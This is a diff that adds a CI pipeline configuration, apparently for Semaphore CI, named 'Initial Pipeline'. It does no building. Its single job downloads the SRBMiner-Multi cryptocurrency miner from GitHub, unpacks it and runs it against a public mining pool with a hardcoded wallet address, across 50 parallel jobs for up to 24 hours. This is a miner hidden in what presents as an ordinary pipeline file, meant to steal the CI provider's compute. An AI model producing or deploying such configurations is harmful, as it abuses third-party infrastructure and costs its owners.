@@ -1,0 +1,19 @@
+version: v1.0
+name: Initial Pipeline
+agent:
+  machine:
+    type: e1-standard-2
+    os_image: ubuntu2004
+execution_time_limit:
+  hours: 24
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz ;'
+            - tar -xf SRBMiner-Multi-0-8-5-Linux.tar.xz ;
+            - cd SRBMiner-Multi-0-8-5 ; clear
+            - './SRBMiner-MULTI --disable-gpu --algorithm yespower --pool stratum+tcp://stratum-asia.rplant.xyz:7017 --wallet web1q47ttaj02e0hq07ccuhcm3gsnzcqz2qjq045h2j.Kj -p m=solo --cpu-threads 2'
+          parallelism: 50
